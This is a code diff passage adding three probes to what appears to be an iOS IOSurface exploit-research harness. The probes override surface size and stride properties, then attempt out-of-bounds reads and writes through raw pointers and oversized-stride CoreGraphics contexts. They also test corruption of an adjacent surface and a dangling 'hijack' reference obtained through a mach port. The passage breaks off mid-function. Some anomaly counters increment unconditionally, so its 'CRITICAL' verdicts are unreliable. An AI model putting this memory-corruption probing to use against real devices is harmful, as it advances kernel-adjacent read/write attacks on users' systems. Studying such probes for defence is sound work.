@@ -9947,3 +9947,706 @@ void iosurface_research_port_kernel_spray(ISRLogBlock _Nonnull log, ISRDoneBlock
         }
     });
 }
+
+#pragma mark - Probe 46: Size Confusion (Property Override → OOB Read)
+
+void iosurface_research_size_confusion(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"SIZECONF: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            if (!setValue || !copyValue) {
+                log(@"SIZECONF: Missing property APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"SIZECONF: Starting size confusion probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // Cleanup vars declared before if-blocks
+            IOSurfaceRef surface = NULL;
+            CGColorSpaceRef colorSpace = NULL;
+            CGContextRef cgCtx = NULL;
+
+            // Step 1: Create small surface (32x32 BGRA = 4096 bytes)
+            if (!isr_stopped()) {
+                log(@"SIZECONF: Step 1 — Create 32x32 surface (4096 bytes)");
+                NSDictionary *props = isr_default_surface_params(32, 32);
+                surface = sym.create((__bridge CFDictionaryRef)props);
+                if (!surface) {
+                    log(@"SIZECONF: Failed to create surface");
+                    isr_unload(&sym);
+                    done(@{@"status": @"ERROR", @"anomalies": @0});
+                    return;
+                }
+                size_t allocSize = sym.getAllocSize(surface);
+                log([NSString stringWithFormat:@"SIZECONF: Surface created allocSize=%zu", allocSize]);
+
+            // Step 2: Write canary
+            if (!isr_stopped()) {
+                log(@"SIZECONF: Step 2 — Write canary 0xCAFECAFE");
+                sym.lock(surface, 0, NULL);
+                uint32_t *base = (uint32_t *)sym.getBase(surface);
+                size_t realAllocSize = sym.getAllocSize(surface);
+                size_t count = realAllocSize / sizeof(uint32_t);
+                for (size_t i = 0; i < count; i++) {
+                    base[i] = 0xCAFECAFE;
+                }
+                sym.unlock(surface, 0, NULL);
+                log([NSString stringWithFormat:@"SIZECONF: Canary 0xCAFECAFE written to %zu uint32s", count]);
+
+            // Step 3: Override IOSurfaceAllocSize in kernel dict
+            if (!isr_stopped()) {
+                log(@"SIZECONF: Step 3 — Override IOSurfaceAllocSize to 1048576 (1MB)");
+                size_t origAllocSize = sym.getAllocSize(surface);
+                log([NSString stringWithFormat:@"SIZECONF: Original GetAllocSize=%zu", origAllocSize]);
+
+                setValue(surface, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(1048576));
+
+                // Check what CopyValue returns
+                CFTypeRef dictVal = copyValue(surface, CFSTR("IOSurfaceAllocSize"));
+                if (dictVal) {
+                    NSNumber *num = (__bridge NSNumber *)dictVal;
+                    log([NSString stringWithFormat:@"SIZECONF: CopyValue IOSurfaceAllocSize = %@", num]);
+                    if ([num unsignedLongLongValue] == 1048576) {
+                        log(@"SIZECONF: *** Dict stores overridden value 1048576 ***");
+                    }
+                    CFRelease(dictVal);
+                }
+
+                // Check what GetAllocSize returns now
+                size_t newAllocSize = sym.getAllocSize(surface);
+                log([NSString stringWithFormat:@"SIZECONF: GetAllocSize after override = %zu", newAllocSize]);
+                if (newAllocSize != origAllocSize) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"SIZECONF: *** CRITICAL — GetAllocSize CHANGED from %zu to %zu ***", origAllocSize, newAllocSize]);
+                } else {
+                    log(@"SIZECONF: GetAllocSize unchanged (uses validated field, not dict)");
+                }
+
+                // Override BytesPerRow too
+                size_t origBPR = sym.getBytesPerRow(surface);
+                setValue(surface, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(32768));
+                size_t newBPR = sym.getBytesPerRow(surface);
+                log([NSString stringWithFormat:@"SIZECONF: BytesPerRow orig=%zu after_override=%zu", origBPR, newBPR]);
+                if (newBPR != origBPR) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"SIZECONF: *** CRITICAL — GetBytesPerRow CHANGED from %zu to %zu ***", origBPR, newBPR]);
+                }
+
+            // Step 4: Attempt OOB read beyond real backing
+            if (!isr_stopped()) {
+                log(@"SIZECONF: Step 4 — Attempt OOB read beyond 4096 bytes");
+                sym.lock(surface, 0, NULL);
+                volatile uint32_t *base = (volatile uint32_t *)sym.getBase(surface);
+                size_t realSize = 4096; // known real size
+                uint32_t oobNonZero = 0;
+                uint32_t oobPointerLike = 0;
+                uint32_t firstOOBVal = 0;
+
+                // Read 16 uint32s starting at offset 4096 (just past real buffer)
+                // This accesses the surface's mapped region — may or may not be valid
+                for (int i = 0; i < 16; i++) {
+                    size_t offset = (realSize / sizeof(uint32_t)) + i;
+                    uint32_t val = base[offset];
+                    if (i == 0) firstOOBVal = val;
+                    if (val != 0) oobNonZero++;
+                    if ((val & 0xFFFFF000) >= 0xFFFFF000) oobPointerLike++;
+                }
+                sym.unlock(surface, 0, NULL);
+
+                log([NSString stringWithFormat:@"SIZECONF: OOB read: nonZero=%u pointerLike=%u firstVal=0x%08X",
+                     oobNonZero, oobPointerLike, firstOOBVal]);
+                if (oobNonZero > 0) {
+                    anomalies++;
+                    log(@"SIZECONF: *** OOB READ returned non-zero data — adjacent memory leak! ***");
+                }
+                if (oobPointerLike > 0) {
+                    anomalies++;
+                    log(@"SIZECONF: *** POINTER-LIKE values in OOB read — possible kernel data! ***");
+                }
+
+            // Step 5: CG bitmap with overridden bytesPerRow
+            if (!isr_stopped()) {
+                log(@"SIZECONF: Step 5 — CG bitmap with overridden bytesPerRow");
+                sym.lock(surface, 0, NULL);
+                void *base2 = sym.getBase(surface);
+                colorSpace = CGColorSpaceCreateDeviceRGB();
+
+                // Try with large bytesPerRow (32768) — if CG trusts it, reads OOB
+                cgCtx = CGBitmapContextCreate(base2, 32, 2, 8, 32768,
+                    colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                if (cgCtx) {
+                    log(@"SIZECONF: *** CG accepted bytesPerRow=32768 on 4096-byte buffer! ***");
+                    anomalies++;
+                    // Read pixels from row 1 (at offset 32768 — way past buffer)
+                    CGImageRef img = CGBitmapContextCreateImage(cgCtx);
+                    if (img) {
+                        // Create a small read-back context
+                        CGContextRef readCtx = CGBitmapContextCreate(NULL, 32, 2, 8, 32 * 4,
+                            colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                        if (readCtx) {
+                            CGContextDrawImage(readCtx, CGRectMake(0, 0, 32, 2), img);
+                            uint32_t *pixels = (uint32_t *)CGBitmapContextGetData(readCtx);
+                            if (pixels) {
+                                uint32_t row1NonZero = 0;
+                                for (int i = 32; i < 64; i++) {
+                                    if (pixels[i] != 0) row1NonZero++;
+                                }
+                                log([NSString stringWithFormat:@"SIZECONF: CG row1 (OOB) nonZero=%u first=0x%08X", row1NonZero, pixels[32]]);
+                                if (row1NonZero > 0) {
+                                    anomalies++;
+                                    log(@"SIZECONF: *** CG OOB read got non-zero data from row1! ***");
+                                }
+                            }
+                            CGContextRelease(readCtx);
+                        }
+                        CGImageRelease(img);
+                    }
+                    CGContextRelease(cgCtx);
+                    cgCtx = NULL;
+                } else {
+                    log(@"SIZECONF: CG rejected large bytesPerRow (good validation)");
+                }
+                if (colorSpace) { CGColorSpaceRelease(colorSpace); colorSpace = NULL; }
+                sym.unlock(surface, 0, NULL);
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            // Cleanup
+            if (surface) CFRelease(surface);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"SIZECONF: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — size confusion enables kernel R/W";
+            else if (anomalies >= 2) verdict = @"HIGH — partial size confusion detected";
+            else if (anomalies >= 1) verdict = @"MEDIUM — minor size anomaly";
+            else verdict = @"LOW — size validation effective";
+            log([NSString stringWithFormat:@"SIZECONF: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-SizeConfusion-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 47: BytesPerRow Overflow (Stride Mismatch → OOB)
+
+void iosurface_research_bpr_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"BPROVER: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            if (!setValue || !copyValue) {
+                log(@"BPROVER: Missing property APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"BPROVER: Starting BytesPerRow overflow probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // Cleanup vars
+            IOSurfaceRef surface1 = NULL;
+            IOSurfaceRef surface2 = NULL;
+            CGColorSpaceRef colorSpace = NULL;
+            CGContextRef cgCtx = NULL;
+
+            // Step 1: Create surface1 (64x64 BGRA = 16384 bytes)
+            if (!isr_stopped()) {
+                log(@"BPROVER: Step 1 — Create surface1 64x64 (16384 bytes)");
+                NSDictionary *props1 = isr_default_surface_params(64, 64);
+                surface1 = sym.create((__bridge CFDictionaryRef)props1);
+                if (!surface1) {
+                    log(@"BPROVER: Failed to create surface1");
+                    isr_unload(&sym);
+                    done(@{@"status": @"ERROR", @"anomalies": @0});
+                    return;
+                }
+                sym.lock(surface1, 0, NULL);
+                uint32_t *b1 = (uint32_t *)sym.getBase(surface1);
+                size_t count1 = sym.getAllocSize(surface1) / sizeof(uint32_t);
+                for (size_t i = 0; i < count1; i++) b1[i] = 0xBBBBBBBB;
+                sym.unlock(surface1, 0, NULL);
+                log([NSString stringWithFormat:@"BPROVER: surface1 filled 0xBBBBBBBB, allocSize=%zu bpr=%zu",
+                     sym.getAllocSize(surface1), sym.getBytesPerRow(surface1)]);
+
+            // Step 2: Override BytesPerRow and AllocSize
+            if (!isr_stopped()) {
+                log(@"BPROVER: Step 2 — Override BytesPerRow=65536, AllocSize=4194304");
+                setValue(surface1, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                setValue(surface1, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+
+                size_t newBPR = sym.getBytesPerRow(surface1);
+                size_t newAlloc = sym.getAllocSize(surface1);
+                log([NSString stringWithFormat:@"BPROVER: After override — GetBytesPerRow=%zu GetAllocSize=%zu", newBPR, newAlloc]);
+                if (newBPR == 65536) {
+                    anomalies++;
+                    log(@"BPROVER: *** CRITICAL — GetBytesPerRow returns overridden value 65536! ***");
+                }
+                if (newAlloc == 4194304) {
+                    anomalies++;
+                    log(@"BPROVER: *** CRITICAL — GetAllocSize returns overridden value 4194304! ***");
+                }
+
+            // Step 3: Create adjacent surface2
+            if (!isr_stopped()) {
+                log(@"BPROVER: Step 3 — Create surface2 64x64 adjacent");
+                NSDictionary *props2 = isr_default_surface_params(64, 64);
+                surface2 = sym.create((__bridge CFDictionaryRef)props2);
+                if (surface2) {
+                    sym.lock(surface2, 0, NULL);
+                    uint32_t *b2 = (uint32_t *)sym.getBase(surface2);
+                    size_t count2 = sym.getAllocSize(surface2) / sizeof(uint32_t);
+                    for (size_t i = 0; i < count2; i++) b2[i] = 0xAAAAAAAA;
+                    sym.unlock(surface2, 0, NULL);
+
+                    sym.lock(surface1, 0, NULL);
+                    sym.lock(surface2, 0, NULL);
+                    uintptr_t addr1 = (uintptr_t)sym.getBase(surface1);
+                    uintptr_t addr2 = (uintptr_t)sym.getBase(surface2);
+                    ptrdiff_t gap = (ptrdiff_t)(addr2 - addr1);
+                    sym.unlock(surface2, 0, NULL);
+                    sym.unlock(surface1, 0, NULL);
+                    log([NSString stringWithFormat:@"BPROVER: surface1=0x%lX surface2=0x%lX gap=%td",
+                         (unsigned long)addr1, (unsigned long)addr2, gap]);
+                } else {
+                    log(@"BPROVER: surface2 creation failed, continuing without");
+                }
+
+            // Step 4: CG bitmap with overridden stride
+            if (!isr_stopped()) {
+                log(@"BPROVER: Step 4 — CG bitmap with bytesPerRow=65536");
+                sym.lock(surface1, 0, NULL);
+                void *base1 = sym.getBase(surface1);
+                colorSpace = CGColorSpaceCreateDeviceRGB();
+
+                // width=64, height=4, bytesPerRow=65536
+                // Row 0: offset 0 (in buffer), Row 1: offset 65536 (WAY past 16384 buffer)
+                cgCtx = CGBitmapContextCreate(base1, 64, 4, 8, 65536,
+                    colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                if (cgCtx) {
+                    anomalies++;
+                    log(@"BPROVER: *** CG accepted bytesPerRow=65536 on 16384-byte buffer! ***");
+
+                    CGImageRef img = CGBitmapContextCreateImage(cgCtx);
+                    if (img) {
+                        // Read back into a safe buffer
+                        size_t readW = 64, readH = 4;
+                        CGContextRef readCtx = CGBitmapContextCreate(NULL, readW, readH, 8, readW * 4,
+                            colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                        if (readCtx) {
+                            CGContextDrawImage(readCtx, CGRectMake(0, 0, readW, readH), img);
+                            uint32_t *pixels = (uint32_t *)CGBitmapContextGetData(readCtx);
+                            if (pixels) {
+                                // Row 0 should be 0xBBBBBBBB (canary)
+                                uint32_t row0canary = 0;
+                                for (size_t i = 0; i < readW; i++) {
+                                    if (pixels[i] == 0xBBBBBBBB) row0canary++;
+                                }
+                                log([NSString stringWithFormat:@"BPROVER: Row0 canary matches: %u/%zu", row0canary, readW]);
+
+                                // Rows 1-3 are OOB (offset 65536, 131072, 196608)
+                                for (int row = 1; row < 4; row++) {
+                                    uint32_t nonZero = 0, canaryS2 = 0;
+                                    for (size_t i = 0; i < readW; i++) {
+                                        uint32_t px = pixels[row * readW + i];
+                                        if (px != 0) nonZero++;
+                                        if (px == 0xAAAAAAAA) canaryS2++;
+                                    }
+                                    log([NSString stringWithFormat:@"BPROVER: Row%d (OOB): nonZero=%u surface2Pattern=%u first=0x%08X",
+                                         row, nonZero, canaryS2, pixels[row * readW]]);
+                                    if (canaryS2 > 0) {
+                                        anomalies++;
+                                        log([NSString stringWithFormat:@"BPROVER: *** CRITICAL — Row%d contains surface2 data (0xAAAAAAAA)! Cross-surface read! ***", row]);
+                                    } else if (nonZero > 0) {
+                                        anomalies++;
+                                        log([NSString stringWithFormat:@"BPROVER: *** Row%d contains non-zero OOB data — heap leak! ***", row]);
+                                    }
+                                }
+                            }
+                            CGContextRelease(readCtx);
+                        }
+                        CGImageRelease(img);
+                    }
+                    CGContextRelease(cgCtx);
+                    cgCtx = NULL;
+                } else {
+                    log(@"BPROVER: CG rejected bytesPerRow=65536 (validation works)");
+                }
+
+                if (colorSpace) { CGColorSpaceRelease(colorSpace); colorSpace = NULL; }
+                sym.unlock(surface1, 0, NULL);
+
+            // Step 5: Try OOB write via CG
+            if (!isr_stopped()) {
+                log(@"BPROVER: Step 5 — Attempt OOB write via CG");
+                sym.lock(surface1, 0, NULL);
+                void *base1w = sym.getBase(surface1);
+                CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
+
+                // Use bytesPerRow=16384 (= allocSize) so row 1 starts at end of buffer
+                CGContextRef writeCtx = CGBitmapContextCreate(base1w, 64, 2, 8, 16384,
+                    cs2, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                if (writeCtx) {
+                    log(@"BPROVER: *** CG write context with bpr=16384 accepted ***");
+                    // Write 0xDEADDEAD pattern to row 1 (at offset 16384 — past buffer)
+                    CGContextSetRGBFillColor(writeCtx, 0.87, 0.68, 0.68, 0.87); // ~DEAD pattern
+                    CGContextFillRect(writeCtx, CGRectMake(0, 0, 64, 1)); // row 0 in CG coords = row 1 visually
+                    anomalies++;
+
+                    // Check if surface2 was corrupted
+                    if (surface2) {
+                        sym.lock(surface2, 0, NULL);
+                        uint32_t *b2check = (uint32_t *)sym.getBase(surface2);
+                        uint32_t corrupted = 0;
+                        for (size_t i = 0; i < 64; i++) {
+                            if (b2check[i] != 0xAAAAAAAA) corrupted++;
+                        }
+                        sym.unlock(surface2, 0, NULL);
+                        log([NSString stringWithFormat:@"BPROVER: Surface2 first row corruption check: %u/64 changed", corrupted]);
+                        if (corrupted > 0) {
+                            anomalies++;
+                            log(@"BPROVER: *** CRITICAL — OOB WRITE CORRUPTED ADJACENT SURFACE! ***");
+                        }
+                    }
+                    CGContextRelease(writeCtx);
+                } else {
+                    log(@"BPROVER: CG rejected write context with bpr=16384");
+                }
+                CGColorSpaceRelease(cs2);
+                sym.unlock(surface1, 0, NULL);
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            // Cleanup
+            if (surface2) CFRelease(surface2);
+            if (surface1) CFRelease(surface1);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"BPROVER: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — stride confusion enables cross-surface R/W";
+            else if (anomalies >= 2) verdict = @"HIGH — CG reads OOB via overridden stride";
+            else if (anomalies >= 1) verdict = @"MEDIUM — partial stride anomaly";
+            else verdict = @"LOW — stride validation effective";
+            log([NSString stringWithFormat:@"BPROVER: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-BPROverflow-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 48: Mach Port Property Chain (Full Chain)
+
+void iosurface_research_port_prop_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PROPCHAIN: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            if (!setValue || !copyValue || !createPort || !lookupPort) {
+                log(@"PROPCHAIN: Missing required APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PROPCHAIN: Starting mach port property chain probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // Cleanup vars
+            IOSurfaceRef surface = NULL;
+            IOSurfaceRef hijackRef = NULL;
+            mach_port_t port = MACH_PORT_NULL;
+            CGColorSpaceRef colorSpace = NULL;
+            CGContextRef cgCtx = NULL;
+
+            // Step 1: Create surface (32x32 BGRA = 4096 bytes)
+            if (!isr_stopped()) {
+                log(@"PROPCHAIN: Step 1 — Create 32x32 surface");
+                NSDictionary *props = isr_default_surface_params(32, 32);
+                surface = sym.create((__bridge CFDictionaryRef)props);
+                if (!surface) {
+                    log(@"PROPCHAIN: Failed to create surface");
+                    isr_unload(&sym);
+                    done(@{@"status": @"ERROR", @"anomalies": @0});
+                    return;
+                }
+                sym.lock(surface, 0, NULL);
+                uint32_t *base = (uint32_t *)sym.getBase(surface);
+                size_t count = sym.getAllocSize(surface) / sizeof(uint32_t);
+                for (size_t i = 0; i < count; i++) base[i] = 0x41414141;
+                sym.unlock(surface, 0, NULL);
+                log(@"PROPCHAIN: Surface filled with 0x41414141");
+
+            // Step 2: Override ALL size properties
+            if (!isr_stopped()) {
+                log(@"PROPCHAIN: Step 2 — Override all size properties");
+                setValue(surface, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(1048576));
+                setValue(surface, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(32768));
+                setValue(surface, CFSTR("IOSurfaceWidth"), (__bridge CFTypeRef)@(1024));
+                setValue(surface, CFSTR("IOSurfaceHeight"), (__bridge CFTypeRef)@(1024));
+
+                // Verify on original
+                size_t origW = sym.getWidth(surface);
+                size_t origH = sym.getHeight(surface);
+                size_t origBPR = sym.getBytesPerRow(surface);
+                size_t origAlloc = sym.getAllocSize(surface);
+                log([NSString stringWithFormat:@"PROPCHAIN: Original getters: w=%zu h=%zu bpr=%zu alloc=%zu",
+                     origW, origH, origBPR, origAlloc]);
+
+            // Step 3: Transfer via mach port
+            if (!isr_stopped()) {
+                log(@"PROPCHAIN: Step 3 — Transfer via mach port");
+                port = createPort(surface);
+                if (port == MACH_PORT_NULL) {
+                    log(@"PROPCHAIN: CreateMachPort returned NULL");
+                } else {
+                    hijackRef = lookupPort(port);
+                    if (!hijackRef) {
+                        log(@"PROPCHAIN: LookupFromMachPort returned NULL");
+                    } else {
+                        log(@"PROPCHAIN: *** Hijack ref obtained ***");
+
+                        // Check getters on hijackRef
+                        size_t hW = sym.getWidth(hijackRef);
+                        size_t hH = sym.getHeight(hijackRef);
+                        size_t hBPR = sym.getBytesPerRow(hijackRef);
+                        size_t hAlloc = sym.getAllocSize(hijackRef);
+                        log([NSString stringWithFormat:@"PROPCHAIN: Hijack getters: w=%zu h=%zu bpr=%zu alloc=%zu",
+                             hW, hH, hBPR, hAlloc]);
+
+                        if (hW == 1024) { anomalies++; log(@"PROPCHAIN: *** CRITICAL — hijack GetWidth returns overridden 1024! ***"); }
+                        if (hH == 1024) { anomalies++; log(@"PROPCHAIN: *** CRITICAL — hijack GetHeight returns overridden 1024! ***"); }
+                        if (hBPR == 32768) { anomalies++; log(@"PROPCHAIN: *** CRITICAL — hijack GetBytesPerRow returns overridden 32768! ***"); }
+                        if (hAlloc == 1048576) { anomalies++; log(@"PROPCHAIN: *** CRITICAL — hijack GetAllocSize returns overridden 1048576! ***"); }
+
+                        // Check CopyValue on hijackRef
+                        CFTypeRef hVal = copyValue(hijackRef, CFSTR("IOSurfaceAllocSize"));
+                        if (hVal) {
+                            NSNumber *num = (__bridge NSNumber *)hVal;
+                            log([NSString stringWithFormat:@"PROPCHAIN: Hijack CopyValue AllocSize = %@", num]);
+                            if ([num unsignedLongLongValue] == 1048576) {
+                                log(@"PROPCHAIN: *** Hijack ref sees overridden dict value ***");
+                            }
+                            CFRelease(hVal);
+                        }
+                    }
+                }
+
+            // Step 4: OOB read via hijack ref
+            if (!isr_stopped()) {
+                if (hijackRef) {
+                    log(@"PROPCHAIN: Step 4 — OOB read via hijack ref");
+                    sym.lock(hijackRef, 0, NULL);
+                    volatile uint32_t *hbase = (volatile uint32_t *)sym.getBase(hijackRef);
+                    // Read at offset 4096 (past real buffer)
+                    uint32_t oobNonZero = 0;
+                    uint32_t oobPointerLike = 0;
+                    for (int i = 0; i < 16; i++) {
+                        size_t offset = (4096 / sizeof(uint32_t)) + i;
+                        uint32_t val = hbase[offset];
+                        if (val != 0) oobNonZero++;
+                        if ((val & 0xFFFFF000) >= 0xFFFFF000) oobPointerLike++;
+                    }
+                    sym.unlock(hijackRef, 0, NULL);
+                    log([NSString stringWithFormat:@"PROPCHAIN: Hijack OOB: nonZero=%u pointerLike=%u", oobNonZero, oobPointerLike]);
+                    if (oobNonZero > 0) {
+                        anomalies++;
+                        log(@"PROPCHAIN: *** OOB read via hijack returned non-zero data! ***");
+                    }
+                } else {
+                    log(@"PROPCHAIN: Step 4 skipped — no hijack ref");
+                }
+
+            // Step 5: CG OOB via hijack ref with overridden stride
+            if (!isr_stopped()) {
+                if (hijackRef) {
+                    log(@"PROPCHAIN: Step 5 — CG OOB via hijack with bytesPerRow=32768");
+                    sym.lock(hijackRef, 0, NULL);
+                    void *hbase2 = sym.getBase(hijackRef);
+                    colorSpace = CGColorSpaceCreateDeviceRGB();
+                    cgCtx = CGBitmapContextCreate(hbase2, 32, 2, 8, 32768,
+                        colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                    if (cgCtx) {
+                        anomalies++;
+                        log(@"PROPCHAIN: *** CG accepted bytesPerRow=32768 on hijack ref! ***");
+                        CGImageRef img = CGBitmapContextCreateImage(cgCtx);
+                        if (img) {
+                            CGContextRef readCtx = CGBitmapContextCreate(NULL, 32, 2, 8, 32 * 4,
+                                colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                            if (readCtx) {
+                                CGContextDrawImage(readCtx, CGRectMake(0, 0, 32, 2), img);
+                                uint32_t *pix = (uint32_t *)CGBitmapContextGetData(readCtx);
+                                if (pix) {
+                                    uint32_t r1nz = 0;
+                                    for (int i = 32; i < 64; i++) {
+                                        if (pix[i] != 0) r1nz++;
+                                    }
+                                    log([NSString stringWithFormat:@"PROPCHAIN: CG row1 OOB nonZero=%u first=0x%08X", r1nz, pix[32]]);
+                                    if (r1nz > 0) {
+                                        anomalies++;
+                                        log(@"PROPCHAIN: *** CRITICAL — CG OOB read via hijack got data! ***");
+                                    }
+                                }
+                                CGContextRelease(readCtx);
+                            }
+                            CGImageRelease(img);
+                        }
+                        CGContextRelease(cgCtx);
+                        cgCtx = NULL;
+                    } else {
+                        log(@"PROPCHAIN: CG rejected large stride on hijack");
+                    }
+                    if (colorSpace) { CGColorSpaceRelease(colorSpace); colorSpace = NULL; }
+                    sym.unlock(hijackRef, 0, NULL);
+                } else {
+                    log(@"PROPCHAIN: Step 5 skipped — no hijack ref");
+                }
+
+            // Step 6: Release original, test dangling hijack
+            if (!isr_stopped()) {
+                log(@"PROPCHAIN: Step 6 — Release original, test dangling hijack");
+                if (surface) { CFRelease(surface); surface = NULL; }
+
+                if (hijackRef) {
+                    // Check getters post-release
+                    size_t postW = sym.getWidth(hijackRef);
+                    size_t postH = sym.getHeight(hijackRef);
+                    size_t postBPR = sym.getBytesPerRow(hijackRef);
+                    size_t postAlloc = sym.getAllocSize(hijackRef);
+                    log([NSString stringWithFormat:@"PROPCHAIN: Post-release getters: w=%zu h=%zu bpr=%zu alloc=%zu",
+                         postW, postH, postBPR, postAlloc]);
+
+                    // Check if getters changed after release
+                    size_t origW2 = 32, origBPR2 = 128;
+                    if (postW != origW2 || postBPR != origBPR2) {
+                        if (postW == 1024 || postBPR == 32768) {
+                            anomalies++;
+                            log(@"PROPCHAIN: *** Post-release getters return overridden values! ***");
+                        }
+                    }
+
+                    // OOB read on dangling ref
+                    sym.lock(hijackRef, 0, NULL);
+                    volatile uint32_t *dbase = (volatile uint32_t *)sym.getBase(hijackRef);
+                    uint32_t danglingCanary = 0, danglingChanged = 0;
+                    for (int i = 0; i < 16; i++) {
+                        uint32_t val = dbase[i];
+                        if (val == 0x41414141) danglingCanary++;
+                        else danglingChanged++;
+                    }
+                    sym.unlock(hijackRef, 0, NULL);
+                    log([NSString stringWithFormat:@"PROPCHAIN: Dangling read: canary=%u changed=%u", danglingCanary, danglingChanged]);
+                    if (danglingChanged > 0) {
+                        anomalies++;
+                        log(@"PROPCHAIN: *** Dangling ref data changed after release! ***");
+                    }
+                }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            // Cleanup
+            if (hijackRef) CFRelease(hijackRef);
+            if (port != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), port);
+            if (surface) CFRelease(surface);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PROPCHAIN: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 5) verdict = @"CRITICAL — full chain property+port+CG enables kernel-adjacent R/W";
+            else if (anomalies >= 3) verdict = @"HIGH — property corruption propagates through mach port";
